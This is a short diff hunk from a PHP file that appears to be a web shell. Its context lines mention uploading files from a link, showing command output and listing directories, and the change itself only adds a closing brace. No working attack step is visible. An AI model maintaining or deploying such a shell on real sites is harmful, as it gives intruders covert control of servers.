@@ -707,6 +707,7 @@ Upload File From Link :<br>
         echo "No output yet. Jalankan perintah terlebih dahulu.";
     }
     exit;
+}
 
 if (!is_readable($lokasi)) {
     die("<center>This directory is unreadable :(</center>");
